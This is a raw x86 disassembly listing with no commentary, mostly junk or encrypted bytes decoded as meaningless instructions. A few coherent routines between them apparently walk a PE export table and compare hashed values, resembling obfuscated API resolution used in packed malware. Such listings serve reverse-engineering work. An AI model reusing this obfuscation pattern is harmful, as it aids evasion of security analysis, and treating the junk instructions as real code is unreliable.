  402114:	mov    dl,0xe4
  402116:	cmp    DWORD PTR [edx+0x5d9c53e9],esi
  40211c:	rcl    DWORD PTR [eax+0x73],0x34
  402120:	pop    ecx
  402121:	inc    ecx
  402122:	cmp    al,ah
  402124:	dec    ebx
  402125:	fidivr DWORD PTR [ecx+0x1ad0cb50]
  40212b:	retf   
  40212c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40212d:	xchg   esi,eax
  40212e:	(bad)  
  40212f:	sbb    ecx,DWORD PTR [eax+0x619174b4]
  402135:	mov    bl,0x3a
  402137:	data16 add al,0xfd
  40213a:	fs popf 
  40213c:	pop    edi
  40213d:	sub    DWORD PTR ds:0xf542263,edx
  402143:	icebp  
  402144:	fistp  QWORD PTR [esi-0x2e]
  402147:	dec    esi
  402148:	retf   0x4706
  40214b:	aam    0x7d
  40214d:	add    eax,DWORD PTR [ebx+0x40]
  402150:	xchg   esp,edx
  402152:	dec    ebx
  402153:	jnp    0x40219e
  402155:	sbb    edx,DWORD PTR [ebp-0x1fd895ed]
  40215b:	adc    eax,0x16c46b5c
  402160:	mov    ebx,0x87e90e6d
  402166:	add    DWORD PTR [ebx+0x79],eax
  402169:	mov    ebp,0x2edfda06
  40216e:	xchg   esi,eax
  40216f:	or     BYTE PTR [eax],al
  402171:	fisubr WORD PTR [edx]
  402173:	lahf   
  402174:	xlat   BYTE PTR ds:[ebx]
  402175:	cli    
  402176:	outs   dx,BYTE PTR ds:[esi]
  402177:	stos   BYTE PTR es:[edi],al
  402178:	xor    ah,BYTE PTR [ebp-0x68]
  40217b:	xor    dl,BYTE PTR [eax+esi*4+0x7e2c1c4]
  402182:	adc    dh,cl
  402184:	add    cl,BYTE PTR [edx+0x79]
  402187:	es dec esi
  402189:	test   DWORD PTR [eax+edi*1+0x2b104cc5],ecx
  402190:	and    ecx,ebx
  402192:	js     0x40214c
  402194:	push   edi
  402195:	jnp    0x4021f7
  402197:	fimul  DWORD PTR [ebp-0x12]
  40219a:	or     ah,BYTE PTR [esi+eiz*2]
  40219d:	dec    edx
  40219e:	loopne 0x4021f1
  4021a0:	int3   
  4021a1:	inc    eax
  4021a2:	test   DWORD PTR [esi-0x7a4b503a],esi
  4021a8:	int3   
  4021a9:	aas    
  4021aa:	mov    al,ds:0x3103de6f
  4021af:	inc    esi
  4021b0:	xor    eax,0x57aa86e3
  4021b5:	or     edi,DWORD PTR [ebp-0x3]
  4021b8:	pop    ecx
  4021b9:	imul   edi,DWORD PTR [edx+eiz*8],0x33
  4021bd:	pop    ds
  4021be:	jg     0x4021cc
  4021c0:	int    0x85
  4021c2:	inc    ebx
  4021c3:	sti    
  4021c4:	pop    ebp
  4021c5:	push   ds
  4021c6:	mov    DWORD PTR [ebx+0x3ec50e32],edx
  4021cc:	fcom   DWORD PTR [ebp-0x24]
  4021cf:	inc    ebx
  4021d0:	in     al,dx
  4021d1:	add    bl,BYTE PTR [ebx+0x50577bac]
  4021d7:	add    bl,ah
  4021d9:	popf   
  4021da:	add    al,0xec
  4021dc:	out    0x6c,al
  4021de:	mov    ebx,0x529bf96d
  4021e3:	inc    eax
  4021e4:	mov    edi,0x63be6e92
  4021e9:	mov    cs,WORD PTR [eax]
  4021eb:	adc    dl,BYTE PTR [eax]
  4021ed:	lods   al,BYTE PTR ds:[esi]
  4021ee:	std    
  4021ef:	push   edi
  4021f0:	retf   0x9dc6
  4021f3:	mov    bl,0xe1
  4021f5:	xchg   esi,eax
  4021f6:	xchg   DWORD PTR [edi-0x2b3782cd],edi
  4021fc:	sub    BYTE PTR [edx+0x33],0x7b
  402200:	ficomp DWORD PTR [eax-0x17]
  402203:	mov    esi,0xebd50c1f
  402208:	lock xchg ebp,eax
  40220a:	ror    DWORD PTR [edx],0xde
  40220d:	pop    ebx
  40220e:	retf   
  40220f:	adc    dl,BYTE PTR [edi-0x39]
  402212:	dec    ebp
  402213:	js     0x4021e1
  402215:	xchg   edx,eax
  402216:	ss mov eax,0x75ba9cbc
  40221c:	jl     0x40226f
  40221e:	fs dec ebx
  402220:	xchg   esp,eax
  402221:	xchg   ecx,eax
  402222:	lods   eax,DWORD PTR ds:[esi]
  402223:	(bad)  
  402224:	addr16 mov eax,0xa32cd5d
  40222a:	lahf   
  40222b:	xchg   DWORD PTR [ebp+0x5a],esi
  40222e:	jg     0x40222b
  402230:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402231:	mov    esi,edx
  402233:	xchg   BYTE PTR [ebp+esi*1+0x114b8374],ah
  40223a:	push   0xffffffd0
  40223c:	push   esi
  40223d:	push   ds
  40223e:	ins    BYTE PTR es:[edi],dx
  40223f:	xor    DWORD PTR [ecx+esi*2-0x5],ecx
  402243:	mov    bl,0x30
  402245:	and    eax,0x21dc8ec4
  40224a:	loop   0x4021f2
  40224c:	mov    eax,ds:0x3c18063d
  402251:	aam    0x25
  402253:	dec    eax
  402254:	jb     0x402260
  402256:	(bad)  
  402257:	loop   0x4022c3
  402259:	xchg   DWORD PTR [eax],eax
  40225b:	jno    0x402269
  40225d:	pop    esi
  40225e:	shr    cl,1
  402260:	fwait
  402261:	rcl    dl,1
  402263:	icebp  
  402264:	mov    WORD PTR [ebp-0x4],cx
  402268:	jmp    0x40227a
  40226d:	xor    eax,esi
  40226f:	lea    eax,[eax+ecx*1+0x327299]
  402276:	mov    WORD PTR [ebp-0x4],ax
  40227a:	mov    eax,DWORD PTR [ebp-0xc]
  40227d:	cmp    eax,ebx
  40227f:	je     0x402293
  402285:	mov    eax,DWORD PTR [ebp-0x8]
  402288:	mov    DWORD PTR [eax],0x60341e8e
  40228e:	jmp    0x4028b6
  402293:	mov    eax,DWORD PTR [ebp+0x8]
  402296:	mov    ecx,DWORD PTR [ebp-0x8]
  402299:	xor    eax,esi
  40229b:	add    eax,edi
  40229d:	cmp    DWORD PTR [ecx],eax
  40229f:	je     0x40289e
  4022a5:	mov    ecx,DWORD PTR [ebp-0x14]
  4022a8:	mov    eax,DWORD PTR [ebp-0x8]
  4022ab:	mov    eax,DWORD PTR [eax]
  4022ad:	mov    eax,DWORD PTR [eax+0x3c]
  4022b0:	lea    ecx,[ecx*8+0x78]
  4022b7:	add    eax,ecx
  4022b9:	jmp    0x40248d
  4022be:	je     0x402337
  4022c0:	int3   
  4022c1:	xchg   ecx,eax
  4022c2:	int    0xbd
  4022c4:	jne    0x402339
  4022c6:	jae    0x4022b2
  4022c8:	(bad)  
  4022c9:	pand   mm1,QWORD PTR [edi+edx*2-0x78]
  4022ce:	mov    dh,0x3
  4022d0:	jle    0x402350
  4022d2:	mov    ch,0x7f
  4022d4:	jle    0x402354
  4022d6:	and    eax,0xfff3b3f1
  4022db:	(bad)  
  4022dc:	jle    0x40234f
  4022de:	push   ds
  4022df:	cmp    cl,bl
  4022e1:	gs hlt 
  4022e3:	jne    0x40229b
  4022e5:	jge    0x4022d8
  4022e7:	(bad)  
  4022e8:	in     eax,dx
  4022e9:	jno    0x4022ce
  4022eb:	sbb    ecx,ebx
  4022ed:	xchg   ecx,eax
  4022ee:	push   0x16
  4022f0:	xchg   esi,eax
  4022f1:	mov    ss,WORD PTR ds:0x1a66c604
  4022f7:	out    dx,eax
  4022f8:	xchg   edx,eax
  4022f9:	inc    eax
  4022fa:	dec    ebp
  4022fb:	js     0x40230e
  4022fd:	lods   eax,DWORD PTR ds:[esi]
  4022fe:	pop    ebp
  4022ff:	cmp    al,0xdf
  402301:	sub    eax,0x655ef38e
  402306:	imul   edi,DWORD PTR [ebp-0x2c],0x24
  40230a:	lahf   
  40230b:	push   es
  40230c:	stos   DWORD PTR es:[edi],eax
  40230d:	retf   0xb7e7
  402310:	xor    eax,0xb9cb35a2
  402315:	push   ss
  402316:	mov    ebp,ebp
  402318:	loope  0x402362
  40231a:	(bad)  
  40231b:	push   ecx
  40231c:	(bad)  
  40231d:	sti    
  40231e:	and    dl,dl
  402320:	fnstcw WORD PTR [esp+edi*4]
  402323:	mov    cl,0xcf
  402325:	addr16 ds mov ebx,0x7de6125f
  40232c:	out    0x6e,al
  40232e:	add    BYTE PTR [eax-0x3eab9b7f],0xf0
  402335:	sbb    eax,0x95cb1e43
  40233a:	cmp    DWORD PTR [ebx+0x29],esi
  40233d:	sub    ecx,DWORD PTR [esi+0x24c7126c]
  402343:	jne    0x402374
  402345:	sahf   
  402346:	push   esp
  402347:	ja     0x4022d4
  402349:	sub    ebx,DWORD PTR [ebx-0x57]
  40234c:	ins    BYTE PTR es:[edi],dx
  40234d:	cdq    
  40234e:	dec    edx
  40234f:	in     eax,dx
  402350:	cmp    al,BYTE PTR [ebx+0x4185004d]
  402356:	mov    WORD PTR ds:0xb33a6681,cs
  40235c:	loop   0x4023dc
  40235e:	xchg   edi,eax
  40235f:	jnp    0x4022fd
  402361:	mov    al,ds:0x35a7846a
  402366:	jg     0x40239d
  402368:	pop    es
  402369:	sub    ebx,DWORD PTR [esi-0x626a5b21]
  40236f:	jecxz  0x402370
  402371:	(bad)  
  402372:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  402374:	push   ss
  402375:	mov    al,ds:0xf345a78d
  40237a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40237b:	maskmovq mm4,(bad)
  40237c:	mul    DWORD PTR [eax]
  40237e:	jmp    0xbf5c6b60
  402383:	in     al,dx
  402384:	sti    
  402385:	popa   
  402386:	rcr    BYTE PTR [ebp+0x18cd6a9c],cl
  40238c:	adc    al,bl
  40238e:	jne    0x402319
  402390:	popa   
  402391:	add    esp,eax
  402393:	lock sahf 
  402395:	xchg   ebx,eax
  402396:	cs sub eax,edi
  402399:	repnz into 
  40239b:	cs dec esp
  40239d:	repnz sbb edx,DWORD PTR [ecx+0x74bcc6cf]
  4023a4:	add    DWORD PTR es:[ebp-0x6b0ef0a8],ecx
  4023ab:	inc    ebx
  4023ac:	xchg   BYTE PTR [edi+0x54],bl
  4023af:	loope  0x402408
  4023b1:	pop    esi
  4023b2:	out    dx,al
  4023b3:	repnz call 0xb3b8:0xcfb53a07
  4023bb:	inc    ebp
  4023bc:	int    0xd5
  4023be:	push   ebx
  4023bf:	jmp    0x8493:0x28720bf6
  4023c6:	stc    
  4023c7:	hlt    
  4023c8:	dec    edx
  4023c9:	out    0x83,al
  4023cb:	sub    eax,0x51a98a65
  4023d0:	push   ebp
  4023d1:	push   esi
  4023d2:	fstp   TBYTE PTR [eax+0x1d]
  4023d5:	hlt    
  4023d6:	mov    ebx,0xdcefa483
  4023db:	sar    DWORD PTR [ebp-0x5dec6fff],cl
  4023e1:	dec    ebp
  4023e2:	(bad)  
  4023e3:	jae    0x4023cf
  4023e5:	inc    edi
  4023e6:	ret    0x5018
  4023e9:	xor    ebx,DWORD PTR [eax]
  4023eb:	sbb    al,0x40
  4023ed:	scas   al,BYTE PTR es:[edi]
  4023ee:	inc    esi
  4023ef:	les    edi,FWORD PTR [ebp+0x37a02223]
  4023f5:	arpl   WORD PTR [ebx+ebp*8+0x75],di
  4023f9:	fdivr  QWORD PTR [edx-0x1bb1b883]
  4023ff:	test   al,0x5
  402401:	or     DWORD PTR [esp+esi*4+0x416af128],0xc0c81482
  40240c:	test   BYTE PTR [edi-0x6c0cfbe6],bl
  402412:	mov    esp,0xeeba86f2
  402417:	cld    
  402418:	jnp    0x4023f6
  40241a:	test   DWORD PTR [edi],ecx
  40241c:	jo     0x4023bf
  40241e:	sub    eax,0x9e9fb9b6
  402423:	inc    ecx
  402424:	loopne 0x40247c
  402426:	push   ecx
  402427:	dec    esi
  402428:	clc    
  402429:	pop    ecx
  40242a:	mov    dh,0x59
  40242c:	ins    BYTE PTR es:[edi],dx
  40242d:	ins    BYTE PTR es:[edi],dx
  40242e:	and    esp,DWORD PTR [ecx+0x10]
  402431:	in     al,0x4d
  402433:	pop    edx
  402434:	(bad)  
  402435:	ds fucomip st,st(1)
  402438:	aam    0xec
  40243a:	sbb    eax,DWORD PTR [ebx+0x56537a08]
  402440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402441:	push   ebp
  402442:	and    ah,al
  402444:	pop    ecx
  402445:	and    al,0xdc
  402447:	jge    0x40248f
  402449:	inc    edi
  40244a:	dec    eax
  40244b:	add    ah,0xe
  40244e:	mov    ds:0xeecf96b1,eax
  402453:	and    DWORD PTR [ebx+0x5d8315d4],eax
  402459:	adc    eax,0x7b381a1e
  40245e:	push   ds
  40245f:	jb     0x40240c
  402461:	clc    
  402462:	scas   al,BYTE PTR es:[edi]
  402463:	call   FWORD PTR [eax+0x2102dde3]
  402469:	mov    ds:0xccfbfb3,al
  40246e:	sbb    ah,BYTE PTR [esi]
  402470:	adc    eax,0x14ca976c
  402475:	push   ecx
  402476:	out    0xcb,eax
  402478:	neg    DWORD PTR [eax-0x6be8e3e]
  40247e:	and    BYTE PTR [esi],bl
  402480:	sar    BYTE PTR [ecx],1
  402482:	test   al,0x14
  402484:	shl    BYTE PTR [ecx+0x2a],0x2d
  402488:	aas    
  402489:	cmp    ah,BYTE PTR [eax]
  40248b:	or     esi,DWORD PTR [ebp-0x75]
  40248e:	dec    ebp
  40248f:	clc    
  402490:	mov    ecx,DWORD PTR [ecx]
  402492:	mov    eax,DWORD PTR [eax+ecx*1]
  402495:	mov    DWORD PTR [ebp-0x1c],eax
  402498:	mov    eax,DWORD PTR [ebp+0x8]
  40249b:	xor    eax,esi
  40249d:	add    eax,edi
  40249f:	mov    DWORD PTR [ebp-0x20],eax
  4024a2:	mov    eax,DWORD PTR [ebp+0x8]
  4024a5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024a8:	xor    eax,esi
  4024aa:	add    eax,edi
  4024ac:	cmp    ecx,eax
  4024ae:	je     0x4028b6
  4024b4:	mov    eax,DWORD PTR [ebp-0x8]
  4024b7:	mov    ecx,DWORD PTR [ebp-0x1c]
  4024ba:	add    ecx,DWORD PTR [eax]
  4024bc:	jmp    0x402690
  4024c1:	xor    al,0x5a
  4024c3:	inc    edx
  4024c4:	pop    ebp
  4024c5:	pop    esp
  4024c6:	jge    0x4024fd
  4024c8:	arpl   WORD PTR [edx],ax
  4024ca:	outs   dx,BYTE PTR ds:[esi]
  4024cb:	dec    esi
  4024cc:	or     eax,0x799ac7b3
  4024d1:	in     eax,dx
  4024d2:	or     eax,0x7fb57e7e
  4024d7:	jle    0x402557
  4024d9:	xchg   ecx,eax
  4024da:	add    ah,BYTE PTR [ebp+0x49e178af]
  4024e0:	cmp    ebp,DWORD PTR [ecx-0x5c]
  4024e3:	xchg   ecx,eax
  4024e4:	add    esp,esi
  4024e6:	nop
  4024e7:	mov    BYTE PTR [edx+0x43],bh
  4024ea:	xchg   BYTE PTR [esi+0x1280d19d],bh
  4024f0:	mov    DWORD PTR [edx],ebx
  4024f2:	xchg   ebx,eax
  4024f3:	push   eax
  4024f4:	mov    ?,WORD PTR [esi-0x1048f4b4]
  4024fa:	jg     0x4024ec
  4024fc:	jmp    0xdb9c0c58
  402501:	sti    
  402502:	push   0xffffffb6
  402504:	jnp    0x4024d8
  402506:	test   eax,ebx
  402508:	mov    gs,WORD PTR cs:[ecx+0xe8468e8]
  40250f:	test   edi,eax
  402511:	or     al,0x75
  402513:	add    dl,BYTE PTR [ebp-0x27]
  402516:	xchg   ax,ax
  402518:	push   edx
  402519:	cmp    ecx,ecx
  40251b:	sbb    BYTE PTR [edi],ah
  40251d:	int    0xea
  40251f:	xchg   DWORD PTR [ecx+0x2b],esi
  402522:	pop    es
  402523:	pop    eax
  402524:	in     al,0xb4
  402526:	sbb    BYTE PTR [eax-0x8],0x4f
  40252a:	dec    esp
  40252b:	push   ss
  40252c:	mov    edi,?
  40252e:	xchg   ecx,eax
  40252f:	sub    al,0x8b
  402531:	cmp    al,0x4e
  402533:	sbb    DWORD PTR [edi],0xb99dcf39
  402539:	mov    al,0x8b
  40253b:	sub    eax,0x2c287ac0
  402540:	lea    ebx,ds:0x258506f2
  402546:	jae    0x40252e
  402548:	fisubr DWORD PTR [ebx+0x76fdb174]
  40254e:	mov    dl,0xa5
  402550:	test   eax,0x37addcd9
  402555:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402556:	mov    cl,0x5f
  402558:	hlt    
  402559:	js     0x4024e9
  40255b:	sub    DWORD PTR [edi+eax*2+0x2a],esi
  40255f:	adc    eax,0x283df336
  402564:	pushf  
  402565:	pop    edi
  402566:	pop    ebx
  402567:	or     al,0x7a
  402569:	adc    edx,DWORD PTR [ebx]
  40256b:	inc    esp
  40256c:	cld    
  40256d:	ds jl  0x4025b8
  402570:	inc    esp
  402571:	in     al,dx
  402572:	test   al,0x40
  402574:	cdq    
  402575:	xchg   DWORD PTR [ebp+0x30],esp
  402578:	inc    DWORD PTR [ecx-0x53]
  40257b:	and    al,0x16
  40257d:	ret    
  40257e:	daa    
  40257f:	ins    DWORD PTR es:[edi],dx
  402580:	jge    0x40259a
  402582:	outs   dx,BYTE PTR ds:[esi]
  402583:	cs loopne 0x4025ec
  402586:	push   0xcf7c68e8
  40258b:	jae    0x4025c4
  40258d:	mov    DWORD PTR [edi-0x5],edi
  402590:	nop
  402591:	adc    edx,edx
  402593:	mov    ch,0x49
  402595:	jne    0x402543
  402597:	inc    edx
  402598:	arpl   sp,di
  40259a:	add    al,0x7d
  40259c:	cld    
  40259d:	outs   dx,BYTE PTR ds:[esi]
  40259e:	add    esi,DWORD PTR [eax-0x6e]
  4025a1:	lds    ebx,FWORD PTR [ebp+edi*8-0x54852f54]
  4025a8:	lods   al,BYTE PTR ds:[esi]
  4025a9:	push   edx
  4025aa:	mov    esp,0x9ecc399d
  4025af:	fistp  QWORD PTR [ecx+0x6c]
  4025b2:	xor    DWORD PTR [esi-0x25e15a8e],esi
  4025b8:	inc    ebx
  4025b9:	cmp    al,0xb3
  4025bb:	xor    cl,BYTE PTR [bx+si-0x47]
  4025bf:	call   0x1d1cfd62
  4025c4:	pop    eax
  4025c5:	xor    dl,cl
  4025c7:	inc    ebp
  4025c8:	fsub   DWORD PTR [ecx-0x305fb5bb]
  4025ce:	push   eax
  4025cf:	aaa    
  4025d0:	or     cl,BYTE PTR [eax+0x1c]
  4025d3:	xchg   ebx,eax
  4025d4:	mov    ebx,0x3a41e2ce
  4025d9:	add    BYTE PTR [eax+0x3ea45c09],0x28
  4025e0:	iret   
  4025e1:	in     eax,dx
  4025e2:	mov    dh,0x35
  4025e4:	sbb    eax,0x1b5f89c5
  4025e9:	mov    DWORD PTR [esi-0x50],edx
  4025ec:	call   0xb00e:0xd7c2c887
  4025f3:	(bad)  
  4025f4:	iret   
  4025f5:	mov    ah,0x44
  4025f7:	sahf   
  4025f8:	retf   0x6bab
  4025fb:	xchg   edx,eax
  4025fc:	cld    
  4025fd:	cwde   
  4025fe:	mov    al,0x6e
  402600:	idiv   BYTE PTR [edx+0x5b]
  402603:	sar    BYTE PTR [ebp-0x2e80c78d],0xf2
  40260a:	les    esi,FWORD PTR [ebx+0x56]
  40260d:	jns    0x402685
  40260f:	push   eax
  402610:	mov    cs,WORD PTR [eax+0x7]
  402613:	or     eax,0xee41ed
  402618:	ret    0xc5b3
  40261b:	jg     0x402628
  40261d:	addr16 std 
  40261f:	jge    0x4025e7
  402621:	fidiv  WORD PTR [ecx-0x4f]
  402624:	aaa    
  402625:	loope  0x402621
  402627:	sub    edx,esi
  402629:	pushf  
  40262a:	fs addr16 pop esi
  40262e:	sub    ebp,DWORD PTR [edx+0x643983a0]
  402634:	adc    BYTE PTR ds:[ebx+ecx*2+0x5cd147bf],cl
  40263c:	(bad)  
  40263d:	rcl    DWORD PTR [edi+0x3c89f9f0],cl
  402643:	test   DWORD PTR [ebx],edi
  402645:	ret    0x7427
  402648:	push   ebp
  402649:	test   BYTE PTR [edx-0x4b70e066],bh
  40264f:	push   ebp
  402650:	push   ebp
  402651:	js     0x4026b6
  402653:	adc    al,BYTE PTR [ebp-0x6bfb80b8]
  402659:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40265a:	jmp    0xa403:0xf6d6fd1d
  402661:	aas    
  402662:	mov    bl,0xb7
  402664:	sbb    eax,0xdb3f1341
  402669:	aas    
  40266a:	call   0x2158:0xb67c5684
  402671:	addr16 jae 0x40260b
  402674:	dec    ecx
  402675:	pusha  
  402676:	nop
  402677:	pop    ebp
  402678:	pop    esp
  402679:	mov    bh,0x76
  40267b:	mov    ebp,0x5ffc0433
  402680:	into   
  402681:	fnsave [edx-0x3c]
  402684:	lahf   
  402685:	adc    DWORD PTR [ebx],esi
  402687:	push   edi
  402688:	push   eax
  402689:	push   esp
  40268a:	mov    cl,0x4c
  40268c:	pop    ecx
  40268d:	mov    al,ds:0x4d894e71
  402692:	loopne 0x40261f
  402694:	inc    ebp
  402695:	loopne 0x402622
  402697:	dec    ebp
  402698:	clc    
  402699:	mov    eax,DWORD PTR [eax+0xc]
  40269c:	mov    ecx,DWORD PTR [ecx]
  40269e:	mov    al,BYTE PTR [eax+ecx*1]
  4026a1:	add    al,0x3a
  4026a3:	xor    al,0x44
  4026a5:	cmp    al,0xc1
  4026a7:	je     0x402892
  4026ad:	mov    eax,DWORD PTR [ebp+0x8]
  4026b0:	mov    ecx,DWORD PTR [ebp-0x8]
  4026b3:	xor    eax,esi
  4026b5:	add    eax,edi
  4026b7:	jmp    0x40288b
  4026bc:	ins    BYTE PTR es:[edi],dx
  4026bd:	jo     0x4026e5
  4026bf:	arpl   WORD PTR [edx],si
  4026c1:	jge    0x402730
  4026c3:	jno    0x402694
  4026c5:	adc    al,0x86
  4026c7:	mov    dl,0x22
  4026c9:	push   ebp
  4026ca:	xor    cl,BYTE PTR [eax+0x7e7e0f24]
  4026d0:	mov    ch,0x7f
  4026d2:	jle    0x402752
  4026d4:	pop    es
  4026d5:	mov    ecx,0xdc1a28ce
  4026da:	imul   edx,DWORD PTR [esi-0x51921f5d],0x9f6c369d
  4026e4:	dec    esi
  4026e5:	sub    al,0x9d
  4026e7:	and    esp,eax
  4026e9:	jecxz  0x4026f3
  4026eb:	fistp  QWORD PTR [ebx+0x4162e38c]
  4026f1:	mov    ebx,0xa070b726
  4026f6:	add    edi,eax
  4026f8:	std    
  4026f9:	xor    BYTE PTR [esi+edx*8-0x790a33e3],bh
  402700:	add    ah,BYTE PTR [esi+ebx*2]
  402703:	jns    0x40276f
  402705:	pushf  
  402706:	les    ebp,FWORD PTR ss:[ebx-0x7b]
  40270a:	in     eax,0xbf
  40270c:	sahf   
  40270d:	mov    dl,dh
  40270f:	inc    edx
  402710:	xor    eax,0x7df2cca2
  402715:	mov    ebx,0xffb8339f
  40271a:	xor    dh,BYTE PTR [eax+0x60]
  40271d:	retf   0x2f9b
  402720:	imul   ebx,DWORD PTR [ebp-0x328326bf],0xba749b22
  40272a:	imul   esi,esp,0xfffffff2
  40272d:	inc    esi
  40272e:	mov    esp,0xe6947543
  402733:	fisttp WORD PTR [ebp-0x35f2db24]
  402739:	enter  0xd9d0,0x83
  40273d:	push   edx
  40273e:	fbstp  TBYTE PTR [ecx+ebp*8]
  402741:	and    ch,BYTE PTR [edx]
  402743:	xchg   ecx,eax
  402744:	xchg   ebp,eax
  402745:	jecxz  0x402767
  402747:	xchg   esi,eax
  402748:	push   0x6d449c82
  40274d:	ret    0xbfb1
  402750:	pop    ds
  402751:	add    BYTE PTR [ecx],dl
  402753:	push   edi
  402754:	inc    esi
  402755:	push   0xc507621c
  40275a:	pop    eax
  40275b:	jbe    0x40271a
  40275d:	loopne 0x402755
  40275f:	pop    ecx
  402760:	dec    ecx
  402761:	jbe    0x4027ad
  402763:	(bad)  
  402764:	hlt    
  402765:	scas   eax,DWORD PTR es:[edi]
  402766:	das    
  402767:	leave  
  402768:	fcom   DWORD PTR [edx-0x224daa2c]
  40276e:	(bad)  
  40276f:	imul   esp,DWORD PTR [eax-0x6f7b49d],0x91e83f98
  402779:	(bad)
  40277c:	jne    0x40276c
  40277e:	(bad)  
  40277f:	jmp    0xa01f:0x345254bf
  402786:	cmp    esi,ecx
  402788:	ret    
  402789:	push   ebp
  40278a:	dec    ecx
  40278b:	cdq    
  40278c:	jno    0x402801
  40278e:	shl    DWORD PTR [ecx],1
  402790:	mov    ebx,0xdf536ce5
  402795:	mov    ah,0xe4
  402797:	xchg   esi,eax
  402798:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402799:	imul   esp,ebx,0x76
  40279c:	mov    bh,0xf0
  40279e:	loopne 0x402755
  4027a0:	xor    ah,BYTE PTR [edi+0x35]
  4027a3:	fild   WORD PTR [esi-0x71645580]
  4027a9:	gs retf 0x99e8
  4027ad:	adc    eax,0xe89afbce
  4027b2:	mov    ebp,DWORD PTR [ecx]
  4027b4:	ja     0x402816
  4027b6:	jns    0x2e3998ab
  4027bc:	and    ch,bl
  4027be:	adc    al,0xee
  4027c0:	dec    esi
  4027c1:	les    ebx,FWORD PTR [esi]
  4027c3:	sub    eax,0xd618cf55
  4027c8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4027c9:	imul   esp,DWORD PTR [edx],0x8f05da25
  4027cf:	inc    edx
  4027d0:	ins    BYTE PTR es:[edi],dx
  4027d1:	lea    ebx,[edi]
  4027d3:	add    esi,ecx
  4027d5:	mov    DWORD PTR [esi+0x5e],eax
  4027d8:	out    dx,eax
  4027d9:	ins    BYTE PTR es:[edi],dx
  4027da:	test   bl,dh
  4027dc:	aas    
  4027dd:	xlat   BYTE PTR ds:[ebx]
  4027de:	mov    ebp,0x9760d9bb
  4027e3:	retf   0xf25b
  4027e6:	mov    ebx,0x1452b4d1
  4027eb:	retf   
  4027ec:	loopne 0x402794
  4027ee:	xor    edi,ecx
  4027f0:	mov    edx,0x22a02823
  4027f5:	mov    ah,0x4c
  4027f7:	inc    eax
  4027f8:	jnp    0x4027bf
  4027fa:	fbld   TBYTE PTR [edi-0x75e0ad37]
  402800:	ss ins DWORD PTR es:[edi],dx
  402802:	xlat   BYTE PTR ds:[ebx]
  402803:	scas   al,BYTE PTR es:[edi]
  402804:	sbb    esi,eax
  402806:	xchg   ebp,eax
  402807:	mov    eax,0x1c92a0c4
  40280c:	jecxz  0x40280e
  40280e:	inc    edx
  40280f:	jb     0x40280c
  402811:	int3   
  402812:	(bad)  
  402813:	cs push ds
  402815:	(bad)  
  402816:	loop   0x4027a1
  402818:	mov    ebp,DWORD PTR [ecx-0x48]
  40281b:	(bad)  
  40281c:	mov    ah,0xe9
  40281e:	adc    edi,DWORD PTR [esi+eiz*1-0x22]
  402822:	test   DWORD PTR [eax],edx
  402824:	dec    ecx
  402825:	out    dx,eax
  402826:	pop    esi
  402827:	mov    esp,0xc8fb566e
  40282c:	retf   0xbfec
  40282f:	(bad)
  402832:	pop    DWORD PTR [esi-0x54]
  402835:	pop    ds
  402836:	test   BYTE PTR [ecx-0x4be8c6ac],al
  40283c:	adc    ecx,ebp
  40283e:	test   al,al
  402840:	xor    eax,0x19c9344
  402845:	wrmsr  
  402847:	and    edi,ebp
  402849:	stos   BYTE PTR es:[edi],al
  40284a:	aam    0x50
  40284c:	dec    esi
  40284d:	push   ebp
  40284e:	je     0x40281f
  402850:	xor    ebx,DWORD PTR [edx-0x42]
  402853:	repnz test al,0xde
  402856:	cwde   
  402857:	adc    ch,BYTE PTR [ebx-0x1c]
  40285a:	fnstsw WORD PTR [esi]
  40285c:	adc    al,0x3a
  40285e:	out    0x2d,al
  402860:	xchg   ebx,eax
  402861:	and    eax,0x5d283264
  402866:	and    al,0x6a
  402868:	cld    
  402869:	cmp    eax,0x4c71bfb9
  40286e:	xchg   DWORD PTR [esi+0x2e],esi
  402871:	pop    edx
  402872:	(bad)  
  402874:	pop    esi
  402875:	shr    BYTE PTR [eax+0x322d5fc5],1
  40287b:	test   BYTE PTR [eax-0x4a],0x4b
  40287f:	sub    DWORD PTR [ecx],ebx
  402881:	stc    
  402882:	daa    
  402883:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402884:	or     eax,0xda885199
  402889:	jmp    0xe941b18f
  40288e:	and    al,0x0
  402890:	add    BYTE PTR [eax],al
  402892:	xor    DWORD PTR [ebp-0xc],0x5fd8c
  402899:	jmp    0x4028b6
  40289e:	mov    eax,DWORD PTR [ebp-0x8]
  4028a1:	mov    ecx,DWORD PTR [ebp-0x18]
  4028a4:	mov    ecx,DWORD PTR [ecx]
  4028a6:	mov    DWORD PTR [eax],ecx
  4028a8:	mov    eax,DWORD PTR [ebp+0xc]
  4028ab:	mov    eax,DWORD PTR [ebp+0x8]
  4028ae:	push   DWORD PTR [ebp-0x8]
  4028b1:	call   0x405275
  4028b6:	mov    eax,DWORD PTR [ebp-0xc]
  4028b9:	cmp    eax,ebx
  4028bb:	je     0x4015da
  4028c1:	mov    eax,DWORD PTR [ebp-0x8]
  4028c4:	mov    eax,DWORD PTR [eax]
  4028c6:	pop    edi
  4028c7:	pop    esi
  4028c8:	pop    ebx
  4028c9:	leave  
  4028ca:	ret    0xc
  4028cd:	push   ebp
  4028ce:	mov    ebp,esp
  4028d0:	sub    esp,0x18
  4028d3:	leave  
  4028d4:	ret    0x8
  4028d7:	push   ebp
  4028d8:	mov    ebp,esp
  4028da:	jmp    0x402a17
  4028df:	sbb    eax,0xb1fd9f1a
  4028e4:	jge    0x402943
  4028e6:	fidivr DWORD PTR [eax+0x1ade0451]
  4028ec:	test   al,0xfc
  4028ee:	(bad)  
  4028ef:	push   ebx
  4028f0:	or     BYTE PTR [esi+0x7e],bh
  4028f3:	push   ds
  4028f4:	jg     0x402974
  4028f6:	jle    0x402912
  4028f8:	inc    esi
  4028f9:	int    0xcc
  4028fb:	ret    
  4028fc:	je     0x40289e
  4028fe:	mov    ecx,0x8251c60c
  402903:	or     ah,BYTE PTR [ebx-0x39]
